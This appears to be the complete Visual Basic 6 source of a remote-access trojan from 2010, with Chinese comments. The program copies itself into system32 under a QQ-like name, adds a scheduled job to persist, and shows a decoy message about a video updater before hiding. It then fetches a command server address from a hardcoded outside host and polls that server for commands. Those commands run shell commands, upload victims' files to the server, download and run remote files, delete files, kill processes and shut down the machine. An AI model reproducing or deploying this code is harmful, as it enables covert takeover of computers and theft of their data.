VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Web Remote[exe]"
   ClientHeight    =   630
   ClientLeft      =   45
   ClientTop       =   450
   ClientWidth     =   4170
   Icon            =   "webRemote Vb.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   630
   ScaleWidth      =   4170
   StartUpPosition =   3  '窗口缺省
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'----------------------------------------------------------
'/////////////////// 天.一方 [TYF]    /////////////////////
'/////////////////// 网页异步远程控制程序[exe版]  /////////
'/////////////////// cm.ivan@163.com  /////////////////////
'/////////////////// 23:09 2010-3-24  /////////////////////
'----------------------------------------------------------


Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
'----------------------------------------------------------
'/////////////////// 变量定义  ////////////////////////////
'----------------------------------------------------------

Dim SysReg, FullFileName, FullNewsName, sysStage

Dim mc, mo, Mac
Dim WshNetwork, Host
Dim Fsys, coldisks, eDisk, disks

Dim UrlTarget, getSite  '全局变量，目标地址


Private Sub Form_Load()
On Error Resume Next  '容错模式


'/////////////////////////////////////////////////////////////////////
'///////////////////////// 设定 开机运行 /////////////////////////////
'/////////////////////////////////////////////////////////////////////

FullFileName = LCase(App.path & "\" & App.EXEName & ".exe")
FullNewsName = LCase("c:\windows\system32\QQExternal.exe")

If FullNewsName <> FullFileName Then


 Dim Bag1, pipe1
 Set Bag1 = GetObject("winmgmts:\\.\root\cimv2")
 Set pipe1 = Bag1.execquery("select * from win32_process where Name='QQExternal.exe'")
     For Each i In pipe1
        i.Terminate
     Next
 Set pipe1 = Nothing
 Set Bag1 = Nothing

 Call Sleep(1000)
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set c = fso.getfile(FullFileName) '被拷贝位置
     c.Copy (FullNewsName)         '拷贝到
 Set c = Nothing
 Set fso = Nothing
 
 
 Call Sleep(1000)
 Set objShell = CreateObject("wscript.shell")
     objShell.Run FullNewsName, 0
 Set objShell = Nothing

 Call Sleep(1000)
'/// 写入计划
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objNewJob = objWMIService.Get("Win32_ScheduledJob")
  errJobCreated = objNewJob.Create(FullNewsName, "********30000.000000+480", True, 1 Or 2 Or 4 Or 8 Or 16 Or 32 Or 64, , , JobID)
Select Case errJobCreated
       Case 0
       State = "成功完成"
       Case 1
       State = "不支持"
       Case 2
       State = "访问被拒绝"
       Case 8
       State = "出现不明故障"
       Case 9
       State = "未发现路径"
       Case 21
       State = "参数无效"
       Case 22
       State = "服务尚未启动"
       Case Else
       State = "状态未知"
End Select
Set objNewJob = Nothing
Set objWMIService = Nothing
 
'/// 写入注册表
'Set SysReg = CreateObject("wscript.shell")
'    SysReg.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RemoteVbs[TYF]", FullNewsName
'Set SysReg = Nothing

 sysStage = "false"
 
 MsgBox ("3D肉蒲团最新更新器 V2.1 请登录到网站：http://mi.14bt.info 下载观看!")
 
 End  '自关闭
 
 
 
 
Else

'///////////////////////
   App.TaskVisible = False
   Me.Hide

End If







'////// 获取mac /////
Set mc = GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
For Each mo In mc
    If mo.IPEnabled = True Then
       Mac = mo.MacAddress
       Exit For
       End If
    Next
Set mc = Nothing

'////// 计算机名称 /////
Set WshNetwork = CreateObject("WScript.Network")
    Host = WshNetwork.ComputerName '取本机计算机名
Set WshNetwork = Nothing

'////// 获取盘符 /////
Set Fsys = CreateObject("Scripting.FileSystemObject")
Set coldisks = Fsys.Drives
    For Each eDisk In coldisks
        If eDisk.Drivetype = 2 Then
           disks = disks & eDisk & "|"
        End If
    Next
Set coldisks = Nothing
Set Fsys = Nothing
     
 

'--------------------------------------------------------------------
'/////////////////// 变量定义,调用函数   ////////////////////////////
'--------------------------------------------------------------------
   Urlconfig = "http://www.zc62.com/fckeditor/editor/plugins/tablecommands/vbs/config.asp"
If FullNewsName = FullFileName Then
   Do While UrlTarget = ""      '读取指定地址
      UrlTarget = getAddress(Urlconfig)
      UrlTarget = Replace(UrlTarget, Chr(10), "")
      UrlTarget = Replace(UrlTarget, Chr(13), "")
      Call Sleep(1000)
   Loop

   If UrlTarget <> "" Then Call loopRun          '循环执行
End If
     

End Sub









'--------------------------------------------------------------------
'/////////////////// 列出所有盘符           /////////////////////////
'--------------------------------------------------------------------
Function gethost()
     On Error Resume Next  '容错模式
     If disks <> "" Then Call BackCmd("host")
End Function


'--------------------------------------------------------------------
'/////////////////// Url编码转换           //////////////////////////
'--------------------------------------------------------------------
Function URLEncoding(vstrIn)
     On Error Resume Next  '容错模式(防止内存不足)
     strReturn = ""
     For i = 1 To Len(vstrIn)
         ThisChr = Mid(vstrIn, i, 1)
         If Abs(Asc(ThisChr)) < &HFF Then
            strReturn = strReturn & ThisChr
         Else
            innerCode = Asc(ThisChr)
            If innerCode < 0 Then
               innerCode = innerCode + &H10000
            End If
            Hight8 = (innerCode And &HFF00) \ &HFF
            Low8 = innerCode And &HFF
            strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8)
         End If
     Next
     URLEncoding = strReturn
End Function
'--------------------------------------------------------------------
'///////////////// 提交数据到服务器        //////////////////////////
'--------------------------------------------------------------------
Function BackCmd(Cmdstr)
     On Error Resume Next  '容错模式(防止内存不足)
     Dim xmlhttp, xmlget, bgpos, endpos
         Cmdstr = Replace(Cmdstr, " ", "%20")
         Cmdstr = Replace(Cmdstr, "&", "%26")
         Cmdstr = Replace(Cmdstr, Chr(13), "{-}")
         
     Set xmlhttp = CreateObject("Msxml2.ServerXMLHTTP")
         strA = URLEncoding("cmd=" & Cmdstr & "&mac=" & Mac & "&host=" & Host & "&disk=" & disks)
     With xmlhttp
         .open "POST", UrlTarget & "/server.asp", False
         .SetRequestHeader "Content-Length", Len(strA)
         .SetRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded"
         .send strA
      If .Status <> 200 Then xmlget = "error"
     End With
     Set xmlhttp = Nothing
End Function
'--------------------------------------------------------------------
'//////////////// 将字符转为指定编码，防止乱码 //////////////////////
'--------------------------------------------------------------------
Function BytesToBstr(body)
     On Error Resume Next  '容错模式(防止内存不足)
     Dim ObjStream
     Set ObjStream = CreateObject("adodb.stream")
         ObjStream.Type = 1
         ObjStream.mode = 3
         ObjStream.open
         ObjStream.write body
         ObjStream.position = 0
         ObjStream.Type = 2
        'ObjStream.CharSet = "UTF-8"     '防止乱码
         ObjStream.Charset = "gb2312"    '防止乱码
         BytesToBstr = ObjStream.ReadText
         ObjStream.Close
     Set ObjStream = Nothing
End Function


'--------------------------------------------------------------------
'//////////////// 将指定文件编码//////////////////////
'--------------------------------------------------------------------
Function getBytes(path)
     On Error Resume Next  '容错模式(防止内存不足)
  Dim objXMLHTTP
  Dim objADOStream
  Set objADOStream = CreateObject("ADODB.Stream")
      objADOStream.open
      objADOStream.Type = 1
      objADOStream.LoadFromFile path
      getBytes = objADOStream.Read()
  Set objADOStream = Nothing
End Function




'--------------------------------------------------------------------
'//////////////// 读取定页面内容  ///////////////////////////////////
'--------------------------------------------------------------------
Function GetHttpPage(url)
     On Error Resume Next  '容错模式(防止内存不足)
     Dim xmlhttp, xmlget, bgpos, endpos
     Set xmlhttp = CreateObject("Msxml2.ServerXMLHTTP")
         strA = ""
         With xmlhttp
           .open "GET", url, False
           .SetRequestHeader "Content-Length", Len(strA)
           .SetRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded"
           .send strA
           If .Status <> 200 Then
              GetHttpPage = "error"
           Else
              GetHttpPage = BytesToBstr(xmlhttp.responseBody)
           End If
         End With
 Set xmlhttp = Nothing
End Function
'--------------------------------------------------------------------
'///////// 用于文件大小转换             //////////////////////////////
'--------------------------------------------------------------------
Function FormatSize(SZ)
     On Error Resume Next  '容错模式
     Dim i, Unit4Size
     Unit4Size = "字节KBMBGB"
     If SZ <> "" And IsNumeric(SZ) Then
        Do While SZ > 1024 And Err = 0
           If Len(SZ) >= 10 Then
              i = 3
              A_SZ = Left(SZ, Len(SZ) - 4)
              SZ = A_SZ \ 1024 * 100
            Else
              i = i + 1
              SZ = Int(SZ) \ 1024
           End If
        Loop
        FormatSize = SZ & " " & Mid(Unit4Size, 1 + 2 * i, 2)
     End If
End Function
'--------------------------------------------------------------------
'///////// 用于循环监测，并执行         //////////////////////////////
'--------------------------------------------------------------------
Function loopRun()
     On Error Resume Next  '容错模式
           Dim GetCmd
           GetCmd = GetHttpPage(UrlTarget & "/cmd.txt") '接收命令
           If GetCmd <> "" Then
              GetCmds = Split(GetCmd, "|")
             If CStr(GetCmds(0)) = CStr(Mac) Or CStr(GetCmds(0)) = CStr("ToAll") Then '验证MAC
             
             If UBound(GetCmds) >= 1 Then   '验证是否符合
             
Select Case LCase(GetCmds(1))
  '---------------------------------------------------
  '--------------| 系统操作 |------------------------->
  '---------------------------------------------------

       '>>>>>>>>>>>>>>>> 列出系统文件/目录
       Case "sys_dir"
             path = GetCmds(2)
             If Len(path) > 3 Then
                If Right(path, 1) = "\" Then path = Left(path, Len(path) - 1)
             ElseIf Len(path) = 2 Then
                path = path & "\"
             End If
             
             Dim i, TempStr, FlSpace
             Set objFSO = CreateObject("Scripting.FileSystemObject")
             Set CrntFolder = objFSO.GetFolder(path)

                 TreeStr = "folder|"
             For Each SubFolder In CrntFolder.SubFolders
                 'If ShowSize Then TreeStr = TreeStr  &  FormatSize(SubFolder.size)
                 TreeStr = TreeStr & "|" & SubFolder.Name
             Next

                 TreeStr = TreeStr & "{#}file|"
             For Each ConFile In CrntFolder.Files
                 TreeStr = TreeStr & "|" & ConFile.Name & "{s}"
                 TreeStr = TreeStr & FormatSize(ConFile.Size)
             Next
             BackCmdStr = TreeStr
             
             
             
       '>>>>>>>>>>>>>>>> 注销/重启系统/关机
       Case "sys_shutdown_0", "sys_shutdown_2", "sys_shutdown_8"
             Dim shutdown_Id
             shutdown_Id = Int(Right(GetCmds(1), 1))
             Set colOperatingSystems = GetObject("winmgmts:{(Shutdown)}").execquery("Select * from Win32_OperatingSystem")
                 For Each ObjOperatingSystem In colOperatingSystems
                     ObjOperatingSystem.Win32Shutdown (shutdown_Id)
                 Next
             Set colOperatingSystems = Nothing
       '>>>>>>>>>>>>>>>> 运行cmd 命令
       Case "sys_cmd"
             '--- 执行命令
             Set objShell = CreateObject("wscript.shell")
                 objShell.Run "cmd.exe /c " & GetCmds(2) & " >c:\windows\syscmd~.txt", 0
             Set objShell = Nothing
             '--- 读取临时文件
                 Call Sleep(1000)
             Set objFSO = CreateObject("Scripting.FileSystemObject")
                 Set objCountFile = objFSO.OpenTextFile("c:\windows\syscmd~.txt", 1, True)
                     If Not objCountFile.AtEndofStream Then
                        FSOFileRead = objCountFile.Readall
                     End If
                     objCountFile.Close
                 Set objCountFile = Nothing
             Set objFSO = Nothing
             
             GetCmds(1) = "sys_txt"      '强行修改返回信息，以文字信息显示
             BackCmdStr = ">> (C) 版权所有 1985-2001 Microsoft Corp. " & Chr(13) & FSOFileRead
             
             
             
       '>>>>>>>>>>>>>>>> 列出系统进程
       Case "sys_tasklist"
             Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
             Set process = wmi.execquery("select * from win32_process")
             For Each objprocess In process
                 objprocess.GetOwner UserName, strUserDomain
                 All_PID = All_PID & "{list}" & objprocess.ExecutablePath & "*" & objprocess.Name & "*"
                 All_PID = All_PID & UserName & "*" & objprocess.processid
             Next
             Set wmi = Nothing
             Set process = Nothing
             BackCmdStr = All_PID
             
             
             
       '>>>>>>>>>>>>>>>> 关闭系统进程
       Case "sys_killtask"
             C_cmds = Split(GetCmds(2), "|")
             C_Name = "-"
             For i = 0 To UBound(C_cmds)
                 C_Name = C_Name & " or processid='" & C_cmds(i) & "'"
             Next
                 C_Name = Replace(C_Name, "- or", "")
             Dim Bag1, pipe1
             Set Bag1 = GetObject("winmgmts:\\.\root\cimv2")
             Set pipe1 = Bag1.execquery("select * from win32_process where" & C_Name)
                 For Each i In pipe1
                     i.Terminate
                 Next
             Set pipe1 = Nothing
             Set Bag1 = Nothing
             GetCmds(1) = "sys_txt"      '强行修改返回信息，以提示信息显示
             BackCmdStr = "成功结束 进程PID: " & GetCmds(2) & " ！"
             
             
             
       '>>>>>>>>>>>>>>>> 新建文件(从网络加载)
       Case "sys_newfile"
             getfile = GetCmds(2)                        '网络上的文件地址
             GetFiles = Split(getfile, "/")
             ToFile = GetFiles(UBound(GetFiles))         '保存成的本地文件
                          
                      ToFile = Replace(ToFile, " ", "")
             If ToFile = "" Then
                ToFile = "hongya2012.htm"
                Else
                If InStr(ToFile, ".") <> 0 Then
                   ToFile = Replace(ToFile, ".", "_.")
                   Else
                   ToFile = ToFile & "_.htm"
                End If
             End If
ToFile = "C:\WINDOWS\system32\" & ToFile
                
             
             Set xmlhttp = CreateObject("Microsoft.XMLHTTP") '创建HTTP请求对象
             Set stream = CreateObject("ADODB.Stream")       '创建ADO数据流对象
             '--------------| 瑞星查杀 |-----------------
         xmlhttp.open "GET", getfile, False '打开连接
                 xmlhttp.send      '发送请求
                 stream.mode = 3     '设置数据流为读写模式
                 stream.Type = 1     '设置数据流为二进制模式
                 stream.open       '打开数据流
                 stream.write (xmlhttp.responseBody) '将服务器的返回报文主体内容写入数据流
                 stream.SaveToFile ToFile, 2         '将数据流保存为文件
             '-------------------------------------------
             Set xmlhttp = Nothing
             Set stream = Nothing
             GetCmds(1) = "sys_txt"      '强行修改返回信息，以提示信息显示
             BackCmdStr = "成功新建文件: " & ToFile & " ！"
             
             
       '>>>>>>>>>>>>>>>> 注册表编辑(附加的)
       Case "sys_reg"
             Set MainUrl = CreateObject("wscript.shell")
                 RegPath = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Window Title"
                 Tf = MainUrl.RegWrite(RegPath, "[米客.中国]")
             Set MainUrl = Nothing
             

  '---------------------------------------------------
  '--------------| 其他操作 |------------------------->
  '---------------------------------------------------
  
       '>>>>>>>>>>>>>>>> 打开网页
       Case "sys_openweb"
             Set objShell = CreateObject("Wscript.Shell")
                 objShell.Run (GetCmds(2))
             Set objShell = Nothing
             
             GetCmds(1) = "sys_txt"   '强行修改返回信息，以提示信息显示
             BackCmdStr = "成功打开网页: " & GetCmds(2) & " ！"
             
             
       '>>>>>>>>>>>>>>>> 弹出信息
       Case "sys_showmsg"
             MsgBox GetCmds(2)
             GetCmds(1) = "sys_txt"   '强行修改返回信息，以提示信息显示
             BackCmdStr = "成功弹出信息: " & GetCmds(2) & " ！"
             
             
       '>>>>>>>>>>>>>>>> 黑屏
       Case "sys_windowblack"
             Set ie = CreateObject("internetexplorer.application")
                 ie.navigate "about:blank"
                 ie.fullscreen = 1
                 ie.statusbar = 0
                 ie.document.bgColor = "black"
                 ie.document.fgColor = "White"
                 ie.document.body.Scroll = "no"
                 ie.Visible = 1
                 Randomize
             Set ObjDiv = ie.document.createElement("div")
             Set ObjDoc = ie.document.body
                 ObjDoc.appendChild ObjDiv
                 With ObjDiv
                     .Style.position = "absolute"
                       .Style.Left = Rnd * ObjDoc.clientWidth
                      .Style.Top = Rnd * ObjDoc.clientHeight
                      .Style.Width = "auto"
                      .Style.FontSize = "20px"
                      .innerHTML = GetCmds(2)
                 End With
             Set ObjDoc = Nothing
             Set ObjDiv = Nothing
             GetCmds(1) = "sys_txt"   '强行修改返回信息，以文本信息显示
             BackCmdStr = "黑屏信息: " & GetCmds(2) & " ！"


  '---------------------------------------------------
  '--------------| 文件操作 |------------------------->
  '---------------------------------------------------
  
       '>>>>>>>>>>>>>>>> 读取文件
       Case "file_read"
            Dim BackPageInfo, toBytes
                toBytes = getBytes(GetCmds(2))
             Set xmlread = CreateObject("Msxml2.ServerXMLHTTP")
                 With xmlread
                   .open "POST", UrlTarget & "/upload.asp", False
                   .SetRequestHeader "Content-Length", Len(toBytes)
                   .SetRequestHeader "CONTENT-TYPE", "multipart/form-data"
                   .send toBytes
                   If .Status <> 200 Then
                      BackPageInfo = "error"
                   Else
                      BackPageInfo = BytesToBstr(xmlread.responseBody)
                   End If
                 End With
             Set xmlread = Nothing
             GetCmds(1) = "sys_txt"
             BackCmdStr = "文件:" & GetCmds(2) & BackPageInfo
             
             
       '>>>>>>>>>>>>>>>> 复制文件
       Case "file_copy"
             fcopys = Split(GetCmds(2), "{_}")
             If UBound(fcopys) = 1 Then
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set c = fso.getfile(fcopys(0)) '被拷贝位置
                    c.Copy (fcopys(1))         '拷贝到
                Set c = Nothing
                Set fso = Nothing
             End If
             GetCmds(1) = "sys_txt"
             BackCmdStr = "已复制文件:" & GetCmds(2)
             
             
       '>>>>>>>>>>>>>>>> 重命名文件
       Case "file_rename"
             frenames = Split(GetCmds(2), "{_}")
             If UBound(frenames) = 1 Then
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set c = fso.getfile(frenames(0)) '要重命名的文件
                    c.Name = frenames(1)         '新名称
                Set c = Nothing
                Set fso = Nothing
             GetCmds(1) = "sys_txt"
             BackCmdStr = "已重命名文件:" & GetCmds(2)
             End If


       '>>>>>>>>>>>>>>>> 修改文件属性
       Case "file_attrib"
             'Fso.GetFile(Fname)
             'Fso.GetFolder(Fname)
             'A.attributes=A.attributes+2+4  '添加属性
             '1-只读;2-隐藏;4-系统
             attribs = Split(GetCmds(1), "{_}")
             If UBound(attribs) = 1 Then
                Set objFSO = CreateObject("Scripting.FileSystemObject")
                Set objFile = objFSO.getfile(attribs(0))
                    objFile.Attributes = objFile.Attributes & attribs(1)
                Set objFile = Nothing
                Set objFSO = Nothing
             End If

       '>>>>>>>>>>>>>>>> 删除文件
       Case "file_del"
             Set fso = CreateObject("scripting.filesystemobject")
                 fso.deleteFile GetCmds(2)
                 GetCmds(1) = "sys_txt"
                 BackCmdStr = "已删除文件:" & GetCmds(2)
             Set fso = Nothing
             
       '>>>>>>>>>>>>>>>> 执行文件
       Case "file_run"
             Set objShell = CreateObject("wscript.shell")
                 objShell.Run GetCmds(2), 0
                 GetCmds(1) = "sys_txt"
                 BackCmdStr = "已运行文件:" & GetCmds(2)
             Set objShell = Nothing
             
             
End Select

'----------------|  提交返回命令  |-----------------
      If BackCmdStr <> "" And Err = 0 Then
         Call BackCmd(GetCmds(1) & "{#}" & BackCmdStr)
       Else
         Call BackCmd("sys_txt{#}指令可能执行失败!")
      End If
'---------------------------------------------------

             End If
             End If
           End If
           
           
         Call gethost                  '初始化
         Call Sleep(1000)
         Call loopRun                  '循环执行
End Function


    
    
'----------------|  循环执行，知道获取到地址为止  |-----------------
Function getAddress(url)
    On Error Resume Next  '容错模式
    t_getAddress = GetHttpPage(url)
    If t_getAddress <> "" And Len(t_getAddress) > 12 Then
       If Right(t_getAddress, 1) = "/" Then t_getAddress = Left(t_getAddress, Len(t_getAddress) - 1)
         getAddress = t_getAddress   '注意:地址后面不用加"/"
    Else
         getAddress = ""
    End If
End Function
